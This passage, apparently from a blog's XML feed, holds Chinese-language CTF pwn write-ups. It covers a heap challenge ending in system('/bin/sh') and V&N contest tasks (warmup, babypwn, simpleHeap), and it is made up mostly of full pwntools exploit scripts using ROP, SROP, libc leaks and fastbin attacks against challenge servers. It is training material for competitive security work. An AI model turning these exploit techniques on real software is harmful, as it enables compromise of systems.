class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V-amp-N招新赛writeup"><a href="#V-amp-N招新赛writeup" class="headerlink" title="V&amp;N招新赛writeup"></a>V&amp;N招新赛writeup</h1><p>参考链接:<a href="https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目首先给了puts函数的地址，可得出libc基址，比赛的时候老想着用栈迁移，但stack_addr是随机的，难度比较大。赛后看了小蓝师傅的博客，又学到了新姿势，返回地址覆盖成ret之后，执行两次ret，刚好返回到第一次输入的地方。然后进行ROP，这题用了prtctl函数把execve禁了，可以用open(flag),read(flag,libc_addr+0x3C6500,0x40),write(1,flag,0x40)获取到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52275</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: 0x"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">info(hex(puts_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Input something: '</span>)</span><br><span class="line">pop_rdi=<span class="number">0x21102</span></span><br><span class="line">pop_rsi=<span class="number">0x202e8</span></span><br><span class="line">pop_rax=<span class="number">0x33544</span></span><br><span class="line">pop_rdx=<span class="number">0x1b92</span></span><br><span class="line">syscall_ret=<span class="number">0xbc375</span></span><br><span class="line">ret=<span class="number">0x937</span></span><br><span class="line">payload = p64(libc_addr+pop_rdi)+p64(<span class="number">0</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">3</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">1</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'write'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(libc_addr+ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'flag\x00\x00\n'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>SROP参考:<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop</a><br>这道题还是借鉴小蓝师傅的做法<br>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vn_pwn_babypwn_1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>off-by-one漏洞，利用堆块重叠修改下一个堆块的size，造成overlap，可leak出libc_addr,再利用overlap进行fastbin attack，修改malloc_hook为one_gadget。但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 